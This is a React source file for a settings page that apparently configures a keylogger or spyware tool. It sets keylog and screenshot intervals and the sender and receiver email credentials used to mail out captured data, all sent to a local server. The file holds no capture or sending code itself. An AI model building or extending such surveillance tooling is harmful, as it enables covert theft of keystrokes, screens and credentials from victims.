import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import React from "react";
import "./styles.css";

function SettingsPage() {
    const [settings, setSettings] = useState({
        email_interval: 600,
        screenshot_interval: 30,
        keylog_interval: 5,
        sender_mail: "",
        sender_password: "",
        receiver_mail: "",
    });

    const navigate = useNavigate();

    useEffect(() => {
        fetchSettings();
    }, []);

    const fetchSettings = async () => {
        try {
            const response = await fetch("http://127.0.0.1:5000/get_settings");
            if (!response.ok) throw new Error("Failed to fetch settings");
            const data = await response.json();
            setSettings(data);
        } catch (error) {
            console.error("Error fetching settings:", error);
        }
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        setSettings((prev) => ({ ...prev, [name]: value }));
    };

    const saveSettings = async () => {
        try {
            const response = await fetch("http://127.0.0.1:5000/update_settings", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(settings),
            });

            if (!response.ok) throw new Error("Failed to save settings");

            alert("✅ Settings Updated Successfully!");
            navigate("/");
        } catch (error) {
            console.error("Error updating settings:", error);
        }
    };

    return (
        <div className="settings-container">
            <h2>Settings</h2>

            <label>Email Interval (sec):</label>
            <input type="number" name="email_interval" value={settings.email_interval} onChange={handleChange} />

            <label>Screenshot Interval (sec):</label>
            <input type="number" name="screenshot_interval" value={settings.screenshot_interval} onChange={handleChange} />

            <label>Keylog Interval (sec):</label>
            <input type="number" name="keylog_interval" value={settings.keylog_interval} onChange={handleChange} />

            <h3>Email Credentials</h3>

            <label>Sender Email:</label>
            <input type="email" name="sender_mail" value={settings.sender_mail} onChange={handleChange} />

            <label>Sender Password:</label>
            <input type="password" name="sender_password" value={settings.sender_password} onChange={handleChange} />

            <label>Receiver Email:</label>
            <input type="email" name="receiver_mail" value={settings.receiver_mail} onChange={handleChange} />

            <button className="save-btn" onClick={saveSettings}>Save Settings</button>
        </div>
    );
}

export default SettingsPage;
